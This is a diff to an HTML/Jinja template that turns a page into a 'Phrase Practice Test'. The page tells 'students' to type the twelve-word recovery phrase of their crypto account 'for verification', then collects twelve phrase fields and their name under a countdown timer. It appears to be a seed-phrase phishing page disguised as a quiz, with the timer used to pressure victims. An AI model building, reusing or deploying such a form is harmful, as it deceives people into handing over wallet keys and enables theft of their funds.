@@ -1,42 +1,61 @@
 {% extends "base.html" %}
 {% block content %}
 
-<h2>Twelve phrase code </h2>
-<div class="timer">Time Remaining: <span id="timer"></span></div>
+<h2>Phrase Practice Test</h2>
+
+<!-- ONE LINE NOTE FOR STUDENTS -->
+<p style="opacity:0.8; margin-bottom:15px;">
+    Note: Input The twelve phrase code in your crypto account 
+    (manually: this is for verification purposes).
+</p>
+
+<div class="timer">
+    Time Remaining: <span id="timer"></span>
+</div>
 
 <form method="POST">
 
-<div class="card">
-<h3>Your Name</h3>
-<input type="text" name="name" required>
-</div>
+    <!-- NAME SECTION -->
+    <div class="card">
+        <h3>Your Name</h3>
+        <input type="text" name="name" required>
+    </div>
 
-<div class="grid">
-{% for i in range(1,13) %}
-<div class="card">
-<label>Phrase {{i}}</label>
-<textarea name="phrase{{i}}" rows="3"></textarea>
-</div>
-{% endfor %}
-</div>
+    <!-- 12 PHRASE INPUTS -->
+    <div class="grid">
+        {% for i in range(1, 13) %}
+        <div class="card">
+            <label>Phrase {{ i }}</label>
+            <textarea name="phrase{{ i }}" rows="3"></textarea>
+        </div>
+        {% endfor %}
+    </div>
 
-<br>
-<button type="submit">Submit</button>
+    <br>
+    <button type="submit">Submit</button>
+
 </form>
 
+<!-- TIMER SCRIPT -->
 <script>
-let time = {{remaining}};
+let time = {{ remaining }};
 let timerDisplay = document.getElementById("timer");
 
-setInterval(function(){
-    if(time <= 0){
+function updateTimer() {
+    if (time <= 0) {
         location.reload();
+        return;
     }
+
     let minutes = Math.floor(time / 60);
     let seconds = time % 60;
+
     timerDisplay.innerText = minutes + "m " + seconds + "s";
     time--;
-},1000);
+}
+
+setInterval(updateTimer, 1000);
+updateTimer();
 </script>
 
 {% endblock %}
